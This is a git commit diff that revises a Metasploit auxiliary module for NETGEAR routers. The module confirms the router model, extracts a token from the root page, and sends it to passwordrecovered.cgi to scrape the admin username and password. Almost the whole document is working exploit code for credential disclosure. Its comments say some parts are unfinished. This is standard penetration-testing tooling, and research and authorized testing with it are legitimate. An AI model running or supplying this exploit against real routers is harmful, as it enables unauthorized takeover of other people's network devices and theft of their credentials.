1d1a947c986d1f5ab302a302eacbe72c8b3f71a1
Carter <cbawsome77@gmail.com>
2017-02-04 21:56:02 -0500

    Improve check and fix token grabbing

--- netgear_admin_password_disclosure.rb
+++ netgear_admin_password_disclosure.rb
@@ -35,14 +35,18 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
     [
       OptPort::new('RPORT', [true, 'The port to connect to RHOST with', 80]),
-      OptString::new('RHOST', [true, 'The router target ip address', nil]),
-      OptBool::new('VERBOSE', [false, 'Add verbose output', false]) 
+      OptString::new('RHOST', [true, 'The router target ip address', nil])
     ], self.class)
   end
 
+  # This is roughly ported from python 
+  # 
+  # But not very well apparently
+  # I kind of replaced this with some regex magic
+  # TODO maybe remove check()
   def scrape(text, start_trig, end_trig)
     if text.include?(start_trig) != -1
-      puts "I'm scraping :D"
+      puts "I'm scraping :D" # NOTE remove this when finished
       return text.split(start_trig, 1)[-1].split(end_trig, 1)[0]
     else
       return nil
@@ -51,33 +55,30 @@ class MetasploitModule < Msf::Auxiliary
 
   def run
     rhost = datastore['RHOST']
-    verb  = datastore['VERBOSE']
     print_status("Checking if #{rhost} is a NETGEAR router")
     
-    if verb
-      print_status("Sending request to http://#{rhost}/")
-    end
-
+    vprint_status("Sending request to http://#{rhost}/")
+    
     is_ng = check
 
     res = send_request_raw({ 'uri' => '/'})
 
     if is_ng == Exploit::CheckCode::Detected
-      token = scrape(res.to_s, "unauth.cgi?id=", "/")
+      #token = scrape(res.to_s, "unauth.cgi?id=", "/")
+      marker_one = "id="
+      marker_two = "\""
+      token = res.to_s[/#{marker_one}(.*?)#{marker_two}/m, 1]
       if token == nil
-        print_error("#{rhost} is not vulnerable")
+        print_error("#{rhost} is not vulnerable: Token not found")
         return
       end
 
       print_status("Token found: #{token}")
-      #url = "#{rhost}/passwordrecovered.cgi?id=#{token}"
       
-      r = send_request_cgi({
-            'method'    => 'POST',
-            'uri'       => "/passwordrecovered.cgi?id=#{token}"
-        })
-        
-      # maybe use .match? here  
+      r = send_request_raw({'uri' => "/passwordrecovered.cgi?id=#{token}"})
+      vprint_status("Sending request to #{rhost}/passwordrecovered.cgi?id=#{token}")
+      # TODO make this work
+      # rindex() doesn't seem to work
       if r.to_s.rindex('Left\">') != nil
         username = scrape(r.to_s, 'Router Admin Username</td>', '</td>')
         username = scrape(username, '>', '\'')
@@ -97,23 +98,22 @@ class MetasploitModule < Msf::Auxiliary
   #This checks the response dor that header.
   def check                             #NOTE: this is working
     res = send_request_raw({'uri'=>'/'})
-    verb = datastore['VERBOSE']
     
     unless res
       fail_with(Failure::Unknown, 'Connection timed out.')
     end
 
     data = res.to_s
-    if verb
-      print_status("Printing response from #{datastore['RHOST']}")
-      puts        ##
-      puts data   # Make it look a bit prettier
-      puts        ##
-    end
+    
+    vprint_status("Printing response from #{datastore['RHOST']}")
+    vprint_status(data)
     
     #puts data
     if data.include? "WWW-Authenticate"
-      print_good('Router is a NETGEAR router')
+      marker_one = "Basic realm=\""
+      marker_two = "\""
+      model = data[/#{marker_one}(.*?)#{marker_two}/m, 1]
+      print_good("Router is a NETGEAR router (#{model})")
       return Exploit::CheckCode::Detected
     else
       print_error('Router is not a NETGEAR router')
